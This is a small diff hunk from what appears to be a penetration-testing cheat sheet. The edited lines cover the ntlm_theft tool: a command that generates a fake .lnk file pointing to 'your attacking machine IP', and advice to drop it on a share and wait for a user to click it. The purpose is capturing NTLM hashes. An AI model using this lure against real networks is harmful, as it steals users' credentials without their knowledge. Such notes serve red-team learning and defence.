@@ -576,7 +576,7 @@ problem with responder that you need to wait to some one to connect to a share, 
 ## ntlm Theft:
 https://github.com/Greenwolf/ntlm_theft
 ```
-$ python3 ntlm_theft.py -g lnk -s [serer_ip address} -f [filename]
+$ python3 ntlm_theft.py -g lnk -s [your attacking machine IP_address] -f [filename]
 ```
 then put the fake link on the saher and wait a user to click on it
 
